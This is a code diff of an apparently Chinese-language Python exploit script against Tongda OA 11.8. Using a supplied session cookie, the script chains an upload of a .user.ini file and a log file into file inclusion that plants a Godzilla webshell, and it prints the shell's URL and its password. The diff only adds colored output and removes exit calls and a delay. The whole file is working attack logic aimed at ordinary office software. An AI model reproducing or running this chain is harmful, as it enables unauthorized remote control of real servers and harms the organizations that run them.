@@ -2,8 +2,15 @@ import requests
 import time
 import base64
 
+RED = '\x1b[1;91m'
+CYAN = '\033[1;36m'
+GREEN = '\033[1;32m'
+BOLD = '\033[1m'
+END = '\033[0m'
+
+
 def Upload_Ini(host): ## 通达11.8上传user.ini文件
-    print('[->] 正在检测<V11.8上传.user.ini文件包含漏洞')
+    print(CYAN + '[->] 正在检测<V11.8上传.user.ini文件包含漏洞' + END)
     # print(("Cookie格式: USER_NAME_COOKIE=admin; PHPSESSID=xxxxx; OA_USER_ID=admin; SID_1=xxxx"))
     print(("Cookie格式:PHPSESSID=xxxxx"))
     cookie = input(('请输入你的cookie: '))
@@ -19,12 +26,10 @@ def Upload_Ini(host): ## 通达11.8上传user.ini文件
     try:
         res = requests.post(url=host + payload, data=data, headers=headers, timeout=5)
         if res.status_code == 200 and '档案已保存' in res.text:
-            print('[*] 成功上传.user.ini文件!')
+            print(GREEN + '[*] 成功上传.user.ini文件!' + END)
             Upload_Log(host, cookie)
-            sys.exit(0)
         else:
-            print('[-] 上传.user.ini文件失败!')
-            sys.exit(0)
+            print(RED + '[-] 上传.user.ini文件失败!\n'+ END)
     except:
         pass
 
@@ -42,12 +47,10 @@ def Upload_Log(target_url,cookie): ## 上传日志文件
     try:
         res = requests.post(url=target_url + payload, data=data, headers=headers, timeout=5)
         if res.status_code == 200 and '档案已保存' in res.text:
-            print('[*] 成功上传log文件!')
+            print(GREEN + '[*] 成功上传log文件!' + END)
             Get_Shell(target_url, cookie)
-            sys.exit(0)
         else:
-            print('[-] 上传log文件失败!\n')
-            sys.exit(0)
+            print(RED + '[-] 上传log文件失败!\n' + END)
     except:
         pass
 
@@ -61,18 +64,15 @@ def Get_Shell(target_url,cookie): ## 通达11.8getshell
         res = requests.get(url=target_url + payload, headers=headers, timeout=5)
         if res.status_code == 200:
             # print('[*] 成功上传冰蝎shell, 密码为: rebeyond')
-            print('[*] 成功上传哥斯拉shell, 密码为: pass')
-            print('[*] Shell地址为: {}'.format(target_url + payload) + '\n')
-            sys.exit(0)
+            print(GREEN + '[*] 成功上传哥斯拉shell, 密码为: pass' + END)
+            print(GREEN + '[*] Shell地址为: {}'.format(target_url + payload) + END)
         else:
             # print('[*]  成功上传冰蝎shell, 密码为: rebyeond')
-            print('[*] 成功上传哥斯拉shell, 密码为: pass')
-            print('[*] Shell地址为: {}'.format(target_url + payload))
-            print('[!] 可能需要等待一会儿即可连接。\n')
-            sys.exit(0)
+            print(GREEN + '[*] 成功上传哥斯拉shell, 密码为: pass' + END)
+            print(GREEN + '[*] Shell地址为: {}'.format(target_url + payload) + END)
+            print(GREEN + '[!] 可能需要等待一会儿即可连接。\n' + END)
     except:
         pass
 
 def run(host):
-    time.sleep(12)
     Upload_Ini(host)
